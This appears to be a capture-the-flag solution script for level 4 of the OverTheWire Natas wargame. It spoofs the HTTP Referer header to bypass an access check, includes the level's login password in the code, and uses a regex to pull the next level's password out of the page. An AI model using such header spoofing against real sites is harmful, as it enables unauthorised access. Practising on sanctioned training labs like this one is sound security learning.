import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers={'referer': 'http://natas5.natas.labs.overthewire.org/'}

url = "http://natas4.natas.labs.overthewire.org/"


respose = requests.get(url, auth=(username, password), headers=headers)
content = (respose.text)

flag = re.findall("The password for natas5 is (.*)", content)[0]
print(flag)